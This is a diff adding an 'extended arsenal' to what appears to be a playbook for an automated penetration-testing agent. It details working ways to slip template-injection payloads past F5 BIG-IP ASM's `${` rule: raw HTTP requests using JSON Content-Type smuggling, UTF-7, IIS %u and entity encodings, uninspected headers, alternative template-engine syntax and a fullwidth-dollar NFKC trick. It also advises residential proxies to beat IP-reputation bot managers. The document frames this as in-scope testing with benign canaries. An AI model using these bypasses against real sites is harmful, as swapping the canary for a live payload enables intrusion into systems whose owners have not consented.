@@ -376,3 +376,116 @@ transforms_tried.jsonl: {class, rung, transform, canary, status, blocked, delive
   still interprets it (apply the vuln agent's verify criteria).
 - Prefer the lowest rung; a single `/**/` that works beats a fragile 5-layer stack.
 - Stay in scope, benign, rate-limited. Never target the WAF tenant/control-plane or fire any DoS vector.
+
+---
+## Extended arsenal — F5 BIG-IP ASM (product-specific `${...}` rule)
+
+# F5 BIG-IP ASM ships a signature anchored on the literal `${` sequence (the SSTI / EL-injection rule). It is
+# START-ANCHORED on those two bytes and does NOT fully decode the request before matching — which is exactly
+# the seam. Fingerprint F5 first (cookies `TS01...`, `BIGipServer...` / `lb-N-p-NNN`), then pick the primitive
+# that matches the BACKEND's own decoding so a BENIGN `${7*7}` canary lands un-mangled past the rule.
+
+### Soft-block fingerprint — trust the body, NOT the status
+# ASM returns a **200** (not a 403/406) with a fixed ~101-byte "Request Rejected" HTML body. A status-only
+# check reads that 200 as success and misses the block entirely.
+```
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 101
+
+<html><head><title>Request Rejected</title></head><body>The requested URL was rejected.</body></html>
+```
+# Baseline-diff: record the endpoint's NORMAL body length (e.g. a JSON API ~59 B); the 101-B "Request Rejected"
+# body is the soft-block tell. Classify every probe by this body signature, never by the status line. (For
+# byte-exact comparison, drive these with a raw socket so no client-side URL-encoding ambiguity creeps in.)
+
+### 1. JSON Content-Type smuggling (the JSON parser does not URL-decode)
+# ASM matches `*json*` in Content-Type and routes the body through its JSON parser, which does NOT URL-decode.
+# URL-encode the payload: ASM sees `%24%7B...` (no literal `${`), the rule stays silent, the backend decodes
+# the value normally downstream.
+```http
+POST /target/endpoint HTTP/1.1
+Host: api.target.tld
+Content-Type: application/json
+Content-Length: 16
+
+q=%24%7B7%2A7%7D
+```
+# Also works as a URL-encoded value INSIDE a JSON string:  {"q":"%24%7B7%2A7%7D"}
+# Content-Type values carrying the `json` substring that all route through the JSON parser (so the rule is skipped):
+#   application/json · application/json; charset=UTF-8 · application/json; foo=bar; junk=true (any junk param) ·
+#   text/json · application/vnd.api+json · application/hal+json · application/ld+json
+
+### 2-4. Encodings ASM does not decode (deliver to a backend that does)
+| # | Encoding of `${7*7}` | ASM sees | lands if the backend... |
+|---|---|---|---|
+| 2 | UTF-7: `+ACQAew-7*7+AH0-` | `+ACQAew-...` (no `${`) | UTF-7-decodes the value (some Java stacks) |
+| 3 | IIS `%u`: `%uFE69%uFE5B7*7%uFE5D` | literal `%uXXXX` | decodes `%u` form (IIS / older .NET) — fullwidth `$ { }` |
+| 4 | HTML-entity-then-URL: `&%2336;&%23123;7*7&%23125;` | `&#..`-shaped noise | HTML-decodes the reflected value (templated render) |
+
+### 5. Header smuggling — which headers ASM runs through the `${...}` rule
+# Several request headers are NOT inspected by this rule. If a sink logs / reflects / templates a header value,
+# smuggle the benign canary there.
+| Header | `${7*7}` rule | use |
+|---|---|---|
+| `User-Agent` | PASSES | logged / reflected UA sinks |
+| `Cookie` | PASSES | templated cookie values |
+| `Accept-Language` | PASSES | reflected locale |
+| `Referer` / `Origin` | BLOCKED | — |
+| `X-Forwarded-For` / `-Host` / `-Proto` / `X-Real-IP` | BLOCKED | — |
+| `True-Client-IP` / `CF-Connecting-IP` / `X-Originating-IP` | BLOCKED | — |
+| `Forwarded` / `X-Request-ID` / `X-Correlation-ID` / arbitrary custom `X-*` | BLOCKED | — |
+
+### 6. Alternative template-engine syntax (dodge the `${` anchor entirely)
+# The rule keys on the literal `${`. A DIFFERENT engine's delimiter is never matched — pick the one the backend
+# actually runs, URL-encode the braces/angles (raw `{` / `<` can confuse an upstream URL parser), send the canary.
+| Engine | Anchor-dodging canary | note |
+|---|---|---|
+| Twig / Jinja2 / Handlebars | `{{7*7}}` | url-encode the braces |
+| Thymeleaf | `*{7*7}` or `[[${7*7}]]` | the `*{` / `[[` prefix beats the start-anchor |
+| Velocity | `#set($x=7*7)$x` | `#set` directive — no `${` |
+| Razor (.NET) | `@(7*7)` / `@{var x=7*7;}@x` | Razor block syntax |
+| ERB (Ruby) | `<%= 7*7 %>` / `<%-= 7*7 -%>` | ERB tags |
+| FreeMarker | `<#assign x=7*7>${x}` | the `<#assign>` prefix: even the inner `${x}` slips the start-anchor |
+| Smarty (PHP) | `{$x=7*7}{$x}` | Smarty |
+| Pug / Jade (Node) | `#{7*7}` / `!{7*7}` | Pug variants |
+
+### 7. Fullwidth dollar `＄` (U+FF04) — NFKC reconstruction
+# Send the fullwidth `＄` (raw UTF-8 `EF BC 84`) instead of `$`. ASM sees the raw bytes, does not fold them to
+# `$`, the rule misses. A backend that NFKC-normalizes input (common in Java) reconstructs `${...}` server-side.
+```http
+GET /target/endpoint?q=＄{7*7} HTTP/1.1          # that ＄ is U+FF04, not an ASCII `$`
+```
+
+### What this ASM rule STILL catches (verified-blocked — don't waste attempts)
+# - plain `${...}` in any URL position (path, query, matrix param)
+# - single `%24%7B...%7D` and double `%2524%257B...%257D` URL-encoding in the query
+# - whitespace inside the braces: `${ 7*7 }`
+# - zero-width / bidi chars between `$` and `{` (NUL, ZWSP, ZWJ, RLO, BOM, soft-hyphen, tab, CR)
+# - path `${...}` (`/api/${7*7}`) and matrix-param `${...}` (`/path;${7*7}`, `/path;jsessionid=${7*7}`)
+# - an HTML entity WITHOUT url-encoding (still contains a literal `${`)
+# - backslash escape `$\{7*7\}`
+
+### Flow
+# 1. fingerprint F5 (cookies) → 2. confirm the rule with `?q=${7*7}` → expect the ~101-B soft-block →
+# 3. pick the primitive by the BACKEND stack (Spring / JSON DTO → #1 · IIS / .NET → #3 · Java+NFKC → #7/#2 ·
+#    header-reflection sink → #5 · a known non-`${}` engine → #6) → 4. a bypass is only informational UNTIL it
+#    lands on a real sink — hand the delivered benign canary to the owning vuln agent (ssti / the reflected sink).
+
+---
+## Extended arsenal — WAF realism: what an IP-reputation / bot layer does NOT yield to request tricks
+
+# Honest limits matter more than an overclaimed bypass. Edge bot-managers (Akamai-class Kona + Bot Manager and
+# the like) gate primarily on SOURCE-IP reputation plus a client-side sensor, NOT on request-side signatures —
+# so the request-mangling levers above do NOTHING against them. Worth recording as "not bypassed":
+# - TLS/JA3-JA4 impersonation of real Chrome / Edge / Firefox / Safari builds → still `Access Denied` (edge ref
+#   page). The block is by IP reputation, not TLS fingerprint — a perfect JA3 does not help.
+# - A real stealth browser (full sensor JS) from a flagged IP → still denied; the bot cookie (`_abck`-class) is
+#   never issued cleanly.
+# - Pragma debug headers (`akamai-x-cache-on`, `akamai-x-get-cache-key`, `akamai-x-get-true-cache-key`,
+#   `akamai-x-feo-trace`) → no debug info leaked; hosts stay 403.
+# - `True-Client-IP` / `X-Forwarded-For` / `X-Real-IP` geo/ip spoofing → no change (the edge trusts its own view).
+# What actually moves the needle: a CLEAN source IP not on the target's threat feed — a residential / mobile
+# proxy, within scope and RoE. Do NOT claim a bypass you could not reproduce: record "not bypassed from this
+# egress; needs a clean-reputation source IP" as the honest result. Any transport/desync CVE is version- and
+# patch-gated — most edge providers patch globally fast, so verify it against THIS target before relying on it.
